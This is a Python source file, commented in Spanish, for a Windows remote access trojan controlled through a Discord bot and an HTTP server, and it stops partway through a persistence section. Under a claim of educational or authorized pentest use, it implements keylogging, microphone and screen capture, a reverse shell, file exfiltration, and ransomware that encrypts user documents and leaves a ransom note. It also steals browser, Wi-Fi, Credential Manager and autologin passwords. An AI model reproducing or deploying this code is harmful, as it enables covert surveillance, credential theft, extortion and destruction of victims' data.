# ============================================================
#  RECOLECTOR MULTIFUNCION + C2 via Bot Discord
#  EDUCATIONAL / AUTHORIZED PENTEST ONLY
# ============================================================

import os
import sys
import re
import io
import json
import time
import wave
import uuid
import base64
import shutil
import sqlite3
import hashlib
import tempfile
import platform
import datetime
import threading
import subprocess
import socket
import zipfile

import requests
import pyscreenshot
import sounddevice as sd
import win32gui
import win32crypt
import win32api
import winreg
import ctypes
import traceback
from Crypto.Cipher import AES
from cryptography.fernet import Fernet, InvalidToken
from pynput import keyboard
from pynput.keyboard import Listener


# ==================== CONFIGURACION ====================
usuario = os.environ.get('USERNAME') or os.environ.get('USER')

# --- Discord Bot ---
DISCORD_BOT_TOKEN = "AQUIVAELTOKEN"
DISCORD_CHANNEL_ID = "1554259077117247520"
DISCORD_MAX_CHARS = 1900

# --- C2 ---
C2_BASE = "http://192.168.18.177:5000"
C2_POLL = 5
HEARTBEAT_INTERVALO = 30

# --- Keylogger ---
INTERVALO_SEGUNDOS = 10
ARCHIVO_LOG = rf"C:\Users\{usuario}\Documents\log.txt"
MAX_BUFFER = 500

# --- Formato marco ---
ANCHO_MARCO = 90
PADDING_IZQ = 3
PADDING_DER = 3
SEPARADOR = "=" * ANCHO_MARCO
SUBSEPARADOR = "-" * ANCHO_MARCO


# ==================== ID UNICO ====================
def _generar_id_unico():
    try:
        hostname = socket.gethostname()
        mac = uuid.getnode()
        base = f"{hostname}-{mac}"
        return hashlib.sha256(base.encode()).hexdigest()[:8]
    except Exception:
        return hashlib.sha256(str(time.time()).encode()).hexdigest()[:8]


VICTIM_ID = _generar_id_unico()
HOSTNAME = socket.gethostname()


# ==================== VARIABLES GLOBALES ====================
log = ""
ultima_ventana = ""
tiempo_fin = time.time() + INTERVALO_SEGUNDOS
contador_lote = 0
buffer_linea = ""
_lock = threading.Lock()

_ejecutando = True
_shell_activa = False
_shell_socket = None
_shell_lock = threading.Lock()


# ==================== FORMATO ====================
def appendlog(string):
    global log
    log += str(string)


def _volcar_buffer(motivo=""):
    global buffer_linea
    with _lock:
        if buffer_linea:
            appendlog(buffer_linea)
            buffer_linea = ""
        if motivo:
            appendlog(motivo)


def obtener_ventana_activa():
    try:
        hwnd = win32gui.GetForegroundWindow()
        titulo = win32gui.GetWindowText(hwnd)
        if not titulo:
            return "Ventana Desconocida"
        if ":" in titulo:
            partes = titulo.split(":")
            ultima = partes[-1].strip()
            if ultima and len(ultima) > 2:
                return ultima
        return titulo
    except Exception:
        return "Ventana Desconocida"


def envolver_texto(texto, ancho):
    palabras = texto.split(" ")
    lineas, linea_actual = [], ""
    for palabra in palabras:
        if len(linea_actual) + len(palabra) + 1 <= ancho:
            linea_actual += (palabra + " ") if linea_actual else palabra
        else:
            if linea_actual:
                lineas.append(linea_actual.rstrip())
            linea_actual = palabra + " "
    if linea_actual:
        lineas.append(linea_actual.rstrip())
    return lineas if lineas else [""]


def parsear_log(texto):
    patron = re.compile(r'(\[[^\]]*\])')
    partes = patron.split(texto)
    bloques, buffer_texto = [], ""
    for parte in partes:
        parte = parte.strip()
        if not parte:
            continue
        if parte.startswith("[") and parte.endswith("]"):
            if buffer_texto.strip():
                bloques.append(("texto", buffer_texto.strip()))
                buffer_texto = ""
            bloques.append(("marcador", parte))
        else:
            buffer_texto += " " + parte
    if buffer_texto.strip():
        bloques.append(("texto", buffer_texto.strip()))
    return bloques


def formatear_marco(contenido, ancho=ANCHO_MARCO):
    ancho_util = ancho - PADDING_IZQ - PADDING_DER - 2
    lineas_salida = [SEPARADOR]
    for tipo, valor in parsear_log(str(contenido)):
        if tipo == "marcador":
            lineas_salida.append(
                "|" + " " * PADDING_IZQ + valor.ljust(ancho_util) + " " * PADDING_DER + "|"
            )
        else:
            for linea in envolver_texto(valor, ancho_util):
                lineas_salida.append(
                    "|" + " " * PADDING_IZQ + linea.ljust(ancho_util) + " " * PADDING_DER + "|"
                )
    lineas_salida.append(SUBSEPARADOR)
    lineas_salida.append(SEPARADOR)
    return "\n".join(lineas_salida)


# ==================== DISCORD ====================
def _discord_send_texto(texto):
    """Envía texto a Discord con chunks, envuelto en bloque de codigo."""
    if not (DISCORD_BOT_TOKEN and DISCORD_CHANNEL_ID):
        return

    url = f"https://discord.com/api/v10/channels/{DISCORD_CHANNEL_ID}/messages"
    headers = {
        "Authorization": f"Bot {DISCORD_BOT_TOKEN}",
        "Content-Type": "application/json"
    }

    max_chunk = DISCORD_MAX_CHARS - 8
    ya_envuelto = texto.strip().startswith("```") and texto.strip().endswith("```")

    for i in range(0, len(texto), max_chunk):
        chunk = texto[i:i + max_chunk]
        contenido = chunk if ya_envuelto else f"```\n{chunk}\n```"
        payload = {"content": contenido}
        try:
            requests.post(url, headers=headers, json=payload, timeout=15)
        except Exception:
            pass


def _discord_send_archivo(mensaje, archivo_bytes, nombre_archivo):
    """Envía archivo a Discord con reintento. Silencioso si falla."""
    if not (DISCORD_BOT_TOKEN and DISCORD_CHANNEL_ID):
        return False
    url = f"https://discord.com/api/v10/channels/{DISCORD_CHANNEL_ID}/messages"
    headers = {"Authorization": f"Bot {DISCORD_BOT_TOKEN}"}

    for intento in range(2):
        try:
            files = {"file": (nombre_archivo, archivo_bytes)}
            data = {"content": mensaje[:DISCORD_MAX_CHARS]}
            r = requests.post(url, headers=headers, data=data, files=files, timeout=120)
            if r.status_code in (200, 201):
                return True
        except Exception:
            time.sleep(2)
    return False


def enviar_log_a_discord(contenido):
    fecha = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    marco = formatear_marco(f"[{fecha}] {contenido}")
    _discord_send_texto(f"\n{marco}\n")


def guardar_en_archivo(contenido):
    try:
        with open(ARCHIVO_LOG, "a", encoding="utf-8") as f:
            f.write(formatear_marco(contenido) + "\n\n")
    except Exception:
        pass


# ==================== KEYLOGGER ====================
def on_press(key):
    global ultima_ventana, buffer_linea

    ventana = obtener_ventana_activa()
    if ventana != ultima_ventana:
        _volcar_buffer()
        ultima_ventana = ventana
        appendlog(f" [Ventana: {ventana}] ")

    try:
        caracter = key.char
        if caracter is None:
            caracter = ""
    except AttributeError:
        if key == keyboard.Key.space:
            caracter = " "
        elif key == keyboard.Key.enter:
            _volcar_buffer()
            appendlog(" [ENTER] ")
            return
        elif key == keyboard.Key.backspace:
            with _lock:
                buffer_linea = buffer_linea[:-1]
            return
        elif key == keyboard.Key.tab:
            caracter = " [TAB] "
        else:
            caracter = f" [{key.name}] "

    with _lock:
        buffer_linea += caracter
        if len(buffer_linea) >= MAX_BUFFER:
            appendlog(buffer_linea)
            buffer_linea = ""


def on_move(x, y):
    pass


def on_click(x, y):
    ahora = time.time()
    if not hasattr(on_click, "_last"):
        on_click._last = (0, 0, 0)
    lx, ly, lt = on_click._last
    if (x, y) != (lx, ly) and (ahora - lt) > 1:
        _volcar_buffer()
        appendlog(f" [Click:{x},{y}] ")
        on_click._last = (x, y, ahora)


def on_scroll(x, y):
    _volcar_buffer()
    appendlog(f" [Scroll:{x},{y}] ")


# ==================== INFO DEL SISTEMA ====================
def system_information():
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        info = (
            f" [Hostname: {hostname}] "
            f" [Usuario: {usuario}] "
            f" [IP: {ip}] "
            f" [Processor: {platform.processor()}] "
            f" [System: {platform.system()}] "
            f" [Machine: {platform.machine()}] "
        )
        appendlog(info)
    except Exception:
        pass


def _obtener_ip_local():
    try:
        return socket.gethostbyname(socket.gethostname())
    except Exception:
        return "?"


# ==================== HEARTBEAT ====================
def enviar_heartbeat():
    try:
        data = {
            "id": VICTIM_ID,
            "hostname": HOSTNAME,
            "usuario": usuario,
            "ip": _obtener_ip_local(),
            "os": f"{platform.system()} {platform.release()}",
        }
        requests.post(f"{C2_BASE}/registro", json=data, timeout=10)
    except Exception:
        pass


def bucle_heartbeat():
    while _ejecutando:
        enviar_heartbeat()
        time.sleep(HEARTBEAT_INTERVALO)


# ==================== MICROFONO ====================
def listar_microfonos():
    try:
        dispositivos = sd.query_devices()
        lineas = []
        for idx, d in enumerate(dispositivos):
            if d["max_input_channels"] > 0:
                lineas.append(
                    f"[{idx}] {d['name']} (canales={d['max_input_channels']}, "
                    f"sr={int(d['default_samplerate'])})"
                )
        return "\n".join(lineas) if lineas else "Sin microfonos detectados"
    except Exception as e:
        return f"Error listando microfonos: {e}"


def microphone(duracion=10, dispositivo="default"):
    """Graba audio del micrófono y lo envía a Discord."""
    ruta_wav = None
    try:
        duracion = max(1, min(int(duracion), 300))

        device_idx = None
        samplerate = 44100
        channels = 1

        try:
            dispositivos = sd.query_devices()
            entradas = [(i, d) for i, d in enumerate(dispositivos)
                        if d["max_input_channels"] > 0]

            if not entradas:
                _discord_send_texto(
                    f"[{VICTIM_ID}] [ERROR] No hay microfonos disponibles"
                )
                return

            if dispositivo != "default":
                try:
                    idx = int(dispositivo)
                    if 0 <= idx < len(dispositivos) and \
                       dispositivos[idx]["max_input_channels"] > 0:
                        device_idx = idx
                    else:
                        _discord_send_texto(
                            f"[{VICTIM_ID}] [WARN] Dispositivo {idx} invalido. "
                            f"Usando default."
                        )
                except ValueError:
                    pass

            if device_idx is None:
                device_idx = entradas[0][0]

            info = sd.query_devices(device_idx)
            samplerate = int(info["default_samplerate"]) or 44100
            channels = min(1, info["max_input_channels"]) or 1

        except Exception as e:
            _discord_send_texto(
                f"[{VICTIM_ID}] [WARN] No se pudo consultar dispositivos: {e}. "
                f"Usando default."
            )

        grabacion = None
        for ch in (channels, 2, 1):
            try:
                grabacion = sd.rec(
                    int(duracion * samplerate),
                    samplerate=samplerate,
                    channels=ch,
                    device=device_idx,
                )
                sd.wait()
                channels = ch
                break
            except Exception:
                grabacion = None
                continue

        if grabacion is None:
            _discord_send_texto(
                f"[{VICTIM_ID}] [ERROR] No se pudo grabar audio. "
                f"Verifica que el microfono no este en uso."
            )
            return

        ruta_wav = os.path.join(
            tempfile.gettempdir(),
            f"audio_{VICTIM_ID}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"
        )

        with wave.open(ruta_wav, 'w') as obj:
            obj.setnchannels(channels)
            obj.setsampwidth(2)
            obj.setframerate(samplerate)
            obj.writeframes(grabacion.tobytes())

        with open(ruta_wav, "rb") as f:
            data = f.read()

        tamaño_mb = len(data) / (1024 * 1024)
        fecha = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        if tamaño_mb > 7.5:
            try:
                factor = int(len(grabacion) / (7.5 * 1024 * 1024 / 2 / 2))
                if factor > 1:
                    reducido = grabacion[::factor]
                    with wave.open(ruta_wav, 'w') as obj:
                        obj.setnchannels(channels)
                        obj.setsampwidth(2)
                        obj.setframerate(samplerate // factor)
                        obj.writeframes(reducido.tobytes())
                    with open(ruta_wav, "rb") as f:
                        data = f.read()
                    tamaño_mb = len(data) / (1024 * 1024)
            except Exception:
                pass

        _discord_send_archivo(
            mensaje=(
                f"[{VICTIM_ID}] [AUDIO] ({duracion}s, disp={device_idx}, "
                f"ch={channels}, sr={samplerate}, {tamaño_mb:.2f} MB) - {fecha}"
            ),
            archivo_bytes=data,
            nombre_archivo=f"audio_{VICTIM_ID}.wav"
        )

    except Exception:
        _discord_send_texto(
            f"[{VICTIM_ID}] [ERROR] microfono:\n\n{traceback.format_exc()[:1500]}\n"
        )
    finally:
        if ruta_wav and os.path.isfile(ruta_wav):
            try:
                os.remove(ruta_wav)
            except Exception:
                pass


# ==================== CAPTURA ====================
def screenshot():
    """Captura la pantalla, la reduce, la convierte a JPG si es grande, y la envía a Discord."""
    try:
        fecha = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        nombre = os.path.join(tempfile.gettempdir(), f"screenshot_{VICTIM_ID}_{fecha}.png")

        try:
            img = pyscreenshot.grab()
        except Exception:
            _discord_send_texto(
                f"[{VICTIM_ID}] [ERROR] grab:\n\n{traceback.format_exc()[:1500]}\n"
            )
            return

        try:
            w, h = img.size
            max_w = 1600
            if w > max_w:
                ratio = max_w / w
                img = img.resize((max_w, int(h * ratio)))
                w, h = img.size
        except Exception:
            w, h = (0, 0)

        nombre_jpg = nombre.replace(".png", ".jpg")
        try:
            img.convert("RGB").save(nombre_jpg, "JPEG", quality=70, optimize=True)
            nombre = nombre_jpg
        except Exception:
            _discord_send_texto(
                f"[{VICTIM_ID}] [ERROR] save:\n\n{traceback.format_exc()[:1500]}\n"
            )
            return

        with open(nombre, "rb") as f:
            data = f.read()

        tamaño_mb = len(data) / (1024 * 1024)

        if len(data) > 7_500_000:
            try:
                img = img.resize((int(w * 0.7), int(h * 0.7)))
                img.convert("RGB").save(nombre, "JPEG", quality=50, optimize=True)
                with open(nombre, "rb") as f:
                    data = f.read()
                tamaño_mb = len(data) / (1024 * 1024)
                w, h = img.size
            except Exception:
                pass

        ok = _discord_send_archivo(
            f"[{VICTIM_ID}] [SCREENSHOT] {w}x{h} - {tamaño_mb:.2f} MB - {fecha}",
            data, os.path.basename(nombre)
        )

        if not ok:
            _discord_send_texto(
                f"[{VICTIM_ID}] [ERROR] No se pudo subir la captura "
                f"({tamaño_mb:.2f} MB). Puede que supere el limite de Discord (8 MB)."
            )

        try:
            os.remove(nombre)
        except Exception:
            pass

    except Exception:
        _discord_send_texto(
            f"[{VICTIM_ID}] [ERROR] screenshot:\n\n{traceback.format_exc()[:1500]}\n"
        )


# ==================== LOGO ASCII ====================
LOGO_ASCII = r"""
                  .       .
                 / \     / \
                /   \   /   \
               /     \_/     \
              |               |
              |    _     _    |
              |   / \   / \   |
              |  |   | |   |  |
               \  \ /   \ /  /
                \  '-----'  /
                 \         /
                  \       /
                   \     /
                    \   /
                     \ /
                      V

          F U I S T E   H A C K E A D O
          =============================
          Tu equipo ha sido comprometido
          Todos tus archivos y contrasenas
          estan en nuestras manos
"""


def mostrar_logo(mensaje_custom=None):
    try:
        texto = mensaje_custom or LOGO_ASCII
        bat_path = os.path.join(tempfile.gettempdir(), f"logo_{VICTIM_ID}.bat")
        contenido = (
            "@echo off\n"
            "color 0c\n"
            "title SISTEMA COMPROMETIDO\n"
            "cls\n"
            f"echo {texto}\n"
            "echo.\n"
            "echo ============================================\n"
            "echo   Presiona cualquier tecla para continuar...\n"
            "echo ============================================\n"
            "pause > nul\n"
        )
        with open(bat_path, "w", encoding="utf-8") as f:
            f.write(contenido)
        subprocess.Popen(["cmd.exe", "/c", "start", "", bat_path], shell=True)
        _discord_send_texto(f"[{VICTIM_ID}] [LOGO] Mostrado en la victima")
    except Exception:
        _discord_send_texto(
            f"[{VICTIM_ID}] [ERROR] logo:\n\n{traceback.format_exc()[:1500]}\n"
        )


# ==================== MOUSE ====================
def posicion_mouse():
    try:
        x, y = win32api.GetCursorPos()
        _discord_send_texto(f"[{VICTIM_ID}] [MOUSE] X={x}, Y={y}")
    except Exception as e:
        _discord_send_texto(f"[{VICTIM_ID}] [ERROR] raton: {e}")


# ==================== REVERSE SHELL ====================
def activar_reverse_shell(puerto, ip):
    global _shell_activa, _shell_socket

    with _shell_lock:
        if _shell_activa:
            _discord_send_texto(
                f"[{VICTIM_ID}] [SHELL] Ya hay una activa. Usa !desconectar primero."
            )
            return
        _shell_activa = True

    def _shell():
        global _shell_socket
        while _shell_activa:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((ip, puerto))
                s.settimeout(None)

                with _shell_lock:
                    _shell_socket = s

                os.dup2(s.fileno(), 0)
                os.dup2(s.fileno(), 1)
                os.dup2(s.fileno(), 2)
                if platform.system() == "Windows":
                    subprocess.call(["cmd.exe"])
                else:
                    subprocess.call(["/bin/bash", "-i"])

                s.close()
                with _shell_lock:
                    _shell_socket = None
            except Exception:
                time.sleep(15)

    threading.Thread(target=_shell, daemon=True).start()
    _discord_send_texto(f"[{VICTIM_ID}] [SHELL] activada en {ip}:{puerto}")


def cerrar_shell():
    global _shell_activa, _shell_socket
    with _shell_lock:
        if not _shell_activa:
            return False
        _shell_activa = False
        if _shell_socket:
            try:
                _shell_socket.shutdown(socket.SHUT_RDWR)
            except Exception:
                pass
            try:
                _shell_socket.close()
            except Exception:
                pass
            _shell_socket = None
    return True


# ==================== ENERGIA ====================
def apagar(delay=0):
    try:
        subprocess.run(["shutdown", "/s", "/t", str(int(delay))], shell=True)
    except Exception as e:
        _discord_send_texto(f"[{VICTIM_ID}] [ERROR] apagando: {e}")


def reiniciar(delay=0):
    try:
        subprocess.run(["shutdown", "/r", "/t", str(int(delay))], shell=True)
    except Exception as e:
        _discord_send_texto(f"[{VICTIM_ID}] [ERROR] reiniciando: {e}")


# ==================== DESCONEXION DEL PAYLOAD ====================
def desconectar_payload(eliminar_tarea=True, tarea_nombre="SystemUpdate"):
    global _ejecutando
    try:
        cerrada = cerrar_shell()

        if eliminar_tarea:
            try:
                subprocess.run(
                    ["schtasks", "/Delete", "/TN", tarea_nombre, "/F"],
                    capture_output=True, shell=True, timeout=15
                )
                for ruta in [
                    os.path.join(os.environ["TEMP"], "MicrosoftUpdate", f"{tarea_nombre}.exe"),
                    os.path.join(os.environ["TEMP"], f"{tarea_nombre}_run.ps1"),
                ]:
                    try:
                        if os.path.isfile(ruta):
                            os.remove(ruta)
                    except Exception:
                        pass
            except Exception:
                pass

        _discord_send_texto(
            f"[{VICTIM_ID}] [DESCONECTANDO] "
            f"Shell={'cerrada' if cerrada else 'no habia'} | "
            f"Persistencia={'eliminada' if eliminar_tarea else 'conservada'}\n"
            f"El proceso terminara en breve."
        )

        _ejecutando = False

        def _salir():
            time.sleep(3)
            os._exit(0)
        threading.Thread(target=_salir, daemon=True).start()

        return True
    except Exception:
        _discord_send_texto(
            f"[{VICTIM_ID}] [ERROR] desconectar:\n\n{traceback.format_exc()[:1500]}\n"
        )
        return False


# ==================== EXFIL ====================
def _crear_zip(ruta_origen, ruta_zip):
    try:
        with zipfile.ZipFile(ruta_zip, "w", zipfile.ZIP_DEFLATED) as zf:
            if os.path.isfile(ruta_origen):
                zf.write(ruta_origen, os.path.basename(ruta_origen))
            else:
                for root, dirs, archivos in os.walk(ruta_origen):
                    for archivo in archivos:
                        completo = os.path.join(root, archivo)
                        relativo = os.path.relpath(completo, os.path.dirname(ruta_origen))
                        try:
                            zf.write(completo, relativo)
                        except Exception:
                            continue
        return True
    except Exception:
        return False


def exfiltrar_a_pc(ruta_origen, ip, puerto):
    try:
        if not os.path.exists(ruta_origen):
            _discord_send_texto(f"[{VICTIM_ID}] [ERROR] No existe: {ruta_origen}")
            return None

        nombre_zip = f"exfil_{VICTIM_ID}{datetime.datetime.now().strftime('%Y%m%d%H%M%S')}.zip"
        ruta_zip = os.path.join(tempfile.gettempdir(), nombre_zip)

        _discord_send_texto(f"[{VICTIM_ID}] [EXFIL] Comprimiendo {ruta_origen}...")
        if not _crear_zip(ruta_origen, ruta_zip):
            _discord_send_texto(f"[{VICTIM_ID}] [ERROR] Fallo compresion")
            return None

        tamaño_mb = os.path.getsize(ruta_zip) / (1024 * 1024)
        _discord_send_texto(f"[{VICTIM_ID}] [EXFIL] ZIP listo: {tamaño_mb:.1f} MB. Enviando...")

        url = f"http://{ip}:{puerto}/upload"
        try:
            with open(ruta_zip, "rb") as f:
                r = requests.post(
                    url,
                    files={"file": (nombre_zip, f)},
                    data={"hostname": HOSTNAME, "usuario": usuario, "id": VICTIM_ID},
                    timeout=600
                )
            if r.status_code == 200:
                _discord_send_texto(
                    f"[{VICTIM_ID}] [OK] ZIP enviado: {nombre_zip} ({tamaño_mb:.1f} MB)"
                )
            else:
                raise Exception(f"HTTP {r.status_code}")
        except Exception as e:
            _discord_send_texto(f"[{VICTIM_ID}] [WARN] Fallo HTTP ({e}). Enviando a Discord...")
            with open(ruta_zip, "rb") as f:
                data = f.read()
            _discord_send_archivo(f"[{VICTIM_ID}] [EXFIL] {nombre_zip}", data, nombre_zip)

        try:
            os.remove(ruta_zip)
        except Exception:
            pass
        return nombre_zip
    except Exception:
        _discord_send_texto(
            f"[{VICTIM_ID}] [ERROR] exfil:\n\n{traceback.format_exc()[:1500]}\n"
        )
        return None


# ==================== RANSOM ====================
EXTENSIONES_OBJETIVO = [
    ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf",
    ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".mp3", ".mp4", ".avi",
    ".zip", ".rar", ".7z", ".sql", ".db", ".csv", ".json", ".xml",
    ".py", ".js", ".html", ".php", ".java", ".cpp", ".cs"
]

CARPETAS_EXCLUIDAS = [
    "Windows", "Program Files", "Program Files (x86)",
    "ProgramData", "$Recycle.Bin", "System Volume Information"
]

_NOTAS = """
============================================================
   TUS ARCHIVOS HAN SIDO CIFRADOS
============================================================

Todos tus documentos, fotos, videos y archivos importantes
han sido cifrados con AES-256.

Para recuperar tus archivos, contacta:
   recuperar@correo-falso.com

Tienes 72 horas antes de que la clave sea destruida.

NO intentes recuperar los archivos por tu cuenta.
============================================================
"""


def _cifrar_archivo(ruta, fernet):
    try:
        with open(ruta, "rb") as f:
            datos = f.read()
        if not datos or datos.startswith(b"FERNET:"):
            return False
        cifrado = b"FERNET:" + fernet.encrypt(datos)
        with open(ruta, "wb") as f:
            f.write(cifrado)
        try:
            os.rename(ruta, ruta + ".locked")
        except Exception:
            pass
        return True
    except Exception:
        return False


def _cifrar_carpeta_interna(ruta_base, fernet):
    contador = 0
    for root, dirs, archivos in os.walk(ruta_base):
        dirs[:] = [d for d in dirs if not any(
            e.lower() in os.path.join(root, d).lower() for e in CARPETAS_EXCLUIDAS
        )]
        for archivo in archivos:
            ext = os.path.splitext(archivo)[1].lower()
            if ext in EXTENSIONES_OBJETIVO:
                if _cifrar_archivo(os.path.join(root, archivo), fernet):
                    contador += 1
    try:
        nota = os.path.join(ruta_base, "LEEME_RANSOM.txt")
        with open(nota, "w", encoding="utf-8") as f:
            f.write(_NOTAS)
    except Exception:
        pass
    return contador


def ransomware_completo(ruta=None, backup=True, ip=None, puerto=6000):
    try:
        if ruta is None:
            ruta = rf"C:\Users\{usuario}\Documents"

        if not os.path.isdir(ruta):
            _discord_send_texto(f"[{VICTIM_ID}] [ERROR] No es carpeta: {ruta}")
            return

        _discord_send_texto(f"[{VICTIM_ID}] [RANSOM] Iniciando sobre {ruta} (backup={backup})")

        nombre_zip = None
        if backup and ip:
            _discord_send_texto(f"[{VICTIM_ID}] [RANSOM] 1/3: exfiltrando originales...")
            nombre_zip = exfiltrar_a_pc(ruta, ip, puerto)
        else:
            _discord_send_texto(f"[{VICTIM_ID}] [RANSOM] 1/3: backup omitido")

        _discord_send_texto(f"[{VICTIM_ID}] [RANSOM] 2/3: cifrando...")
        clave = Fernet.generate_key()
        fernet = Fernet(clave)
        contador = _cifrar_carpeta_interna(ruta, fernet)

        clave_b64 = clave.decode() if isinstance(clave, bytes) else clave
        _discord_send_texto(
            f"[{VICTIM_ID}] [RANSOM] 3/3: completado\n"
            f"\n"
            f"Carpeta    : {ruta}\n"
            f"Archivos   : {contador} cifrados\n"
            f"Backup ZIP : {nombre_zip or 'omitido'}\n"
            f"Clave      : {clave_b64}\n"
            f"\n"
            f"Guarda esa clave para !descifrar"
        )
    except Exception:
        _discord_send_texto(
            f"[{VICTIM_ID}] [ERROR] ransom:\n\n{traceback.format_exc()[:1500]}\n"
        )


def descifrar_carpeta(ruta_base, clave_b64):
    try:
        fernet = Fernet(clave_b64.encode() if isinstance(clave_b64, str) else clave_b64)
        contador = 0
        for root, dirs, archivos in os.walk(ruta_base):
            for archivo in archivos:
                if not archivo.endswith(".locked"):
                    continue
                ruta = os.path.join(root, archivo)
                try:
                    with open(ruta, "rb") as f:
                        datos = f.read()
                    if not datos.startswith(b"FERNET:"):
                        continue
                    original = fernet.decrypt(datos[7:])
                    ruta_original = ruta[:-7]
                    with open(ruta_original, "wb") as f:
                        f.write(original)
                    os.remove(ruta)
                    contador += 1
                except (InvalidToken, Exception):
                    continue
        _discord_send_texto(f"[{VICTIM_ID}] [OK] {contador} archivos descifrados en {ruta_base}")
    except Exception:
        _discord_send_texto(
            f"[{VICTIM_ID}] [ERROR] descifrando:\n\n{traceback.format_exc()[:1500]}\n"
        )


# ==================== ARCHIVOS ====================
def enviar_archivo(ruta):
    try:
        if not os.path.isfile(ruta):
            _discord_send_texto(f"[{VICTIM_ID}] [ERROR] No existe: {ruta}")
            return
        tamaño_mb = os.path.getsize(ruta) / (1024 * 1024)
        with open(ruta, "rb") as f:
            data = f.read()
        _discord_send_archivo(
            f"[{VICTIM_ID}] [ARCHIVO] {ruta} ({tamaño_mb:.2f} MB)",
            data, os.path.basename(ruta)
        )
    except Exception:
        _discord_send_texto(
            f"[{VICTIM_ID}] [ERROR] enviar {ruta}:\n\n{traceback.format_exc()[:1500]}\n"
        )


def listar_carpeta(ruta):
    try:
        if not os.path.isdir(ruta):
            _discord_send_texto(f"[{VICTIM_ID}] [ERROR] No es carpeta: {ruta}")
            return
        entradas = []
        for nombre in os.listdir(ruta):
            completo = os.path.join(ruta, nombre)
            try:
                if os.path.isdir(completo):
                    entradas.append(f"[DIR]  {nombre}")
                else:
                    entradas.append(f"[FILE] {nombre} ({os.path.getsize(completo)} bytes)")
            except Exception:
                entradas.append(f"[???]  {nombre}")
        listado = "\n".join(entradas) if entradas else "(vacia)"
        _discord_send_texto(f"[{VICTIM_ID}] [LIST] {ruta}:\n\n{listado[:3600]}\n")
    except Exception:
        _discord_send_texto(
            f"[{VICTIM_ID}] [ERROR] listar:\n\n{traceback.format_exc()[:1500]}\n"
        )


def enviar_reporte():
    try:
        if os.path.isfile(ARCHIVO_LOG):
            with open(ARCHIVO_LOG, "rb") as f:
                data = f.read()
            _discord_send_archivo(
                f"[{VICTIM_ID}] [REPORTE] log.txt",
                data, f"log_{VICTIM_ID}.txt"
            )
        else:
            _discord_send_texto(f"[{VICTIM_ID}] [ERROR] No hay log.txt todavia")
    except Exception as e:
        _discord_send_texto(f"[{VICTIM_ID}] [ERROR] reporte: {e}")


# ==================== CREDENCIALES ====================
def wifi_passwords():
    resultado = []
    try:
        perfiles = subprocess.run(
            ["netsh", "wlan", "show", "profiles"],
            capture_output=True, text=True, encoding="cp850", errors="ignore"
        ).stdout
        nombres = re.findall(r":\s*(.+)\r", perfiles)
        for nombre in nombres:
            nombre = nombre.strip()
            detalle = subprocess.run(
                ["netsh", "wlan", "show", "profile", nombre, "key=clear"],
                capture_output=True, text=True, encoding="cp850", errors="ignore"
            ).stdout
            match = re.search(r"Contenido de la clave\s*:\s*(.+)", detalle)
            if not match:
                match = re.search(r"Key Content\s*:\s*(.+)", detalle)
            if match:
                resultado.append(f"SSID: {nombre} | Pass: {match.group(1).strip()}")
    except Exception as e:
        resultado.append(f"Error WiFi: {e}")
    return "\n".join(resultado) if resultado else "Sin perfiles WiFi"


def credential_manager():
    try:
        out = subprocess.run(
            ["cmdkey", "/list"],
            capture_output=True, text=True, encoding="cp850", errors="ignore"
        ).stdout
        return out.strip() or "Sin credenciales"
    except Exception as e:
        return f"Error cmdkey: {e}"


def _chrome_key(user_data_dir, local_state_name="Local State"):
    local_state = os.path.join(user_data_dir, local_state_name)
    with open(local_state, "r", encoding="utf-8") as f:
        state = json.load(f)
    encrypted_key = base64.b64decode(state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]


def _decrypt_password(buff, key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except Exception:
        try:
            return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode()
        except Exception:
            return ""


def _extract_browser_passwords(user_data_dir):
    resultado = []
    try:
        key = _chrome_key(user_data_dir)
    except Exception:
        return ["  (no se pudo obtener clave DPAPI)"]
    for perfil in os.listdir(user_data_dir):
        login_db = os.path.join(user_data_dir, perfil, "Login Data")
        if not os.path.isfile(login_db):
            continue
        try:
            tmp = os.path.join(tempfile.gettempdir(), f"ld_{perfil}.tmp")
            shutil.copy2(login_db, tmp)
            conn = sqlite3.connect(tmp)
            cur = conn.cursor()
            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
            for url, user, enc_pass in cur.fetchall():
                pwd = _decrypt_password(enc_pass, key)
                if pwd:
                    resultado.append(f"  [{perfil}] {url} | {user} | {pwd}")
            conn.close()
            os.remove(tmp)
        except Exception:
            continue
    return resultado if resultado else ["  (sin contrasenas)"]


def chrome_passwords():
    try:
        user_data = os.path.join(os.environ["LOCALAPPDATA"], r"Google\Chrome\User Data")
        if not os.path.isdir(user_data):
            return "Chrome no instalado"
        return "\n".join(_extract_browser_passwords(user_data))
    except Exception as e:
        return f"Error Chrome: {e}"


def edge_passwords():
    try:
        user_data = os.path.join(os.environ["LOCALAPPDATA"], r"Microsoft\Edge\User Data")
        if not os.path.isdir(user_data):
            return "Edge no instalado"
        return "\n".join(_extract_browser_passwords(user_data))
    except Exception as e:
        return f"Error Edge: {e}"


def autologin_password():
    try:
        k = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
        )
        u = winreg.QueryValueEx(k, "DefaultUserName")[0]
        p = winreg.QueryValueEx(k, "DefaultPassword")[0]
        return f"{u}:{p}"
    except FileNotFoundError:
        return "Sin autologin configurado"
    except Exception as e:
        return f"Error autologin: {e}"


def recopilar_credenciales():
    partes = [
        "=== AUTOLOGIN ===", autologin_password(),
        "\n=== WIFI ===", wifi_passwords(),
        "\n=== CREDENTIAL MANAGER ===", credential_manager(),
        "\n=== CHROME ===", chrome_passwords(),
        "\n=== EDGE ===", edge_passwords()
    ]
    return "\n".join(partes)


# ==================== PERSISTENCIA ====================
def _es_admin():
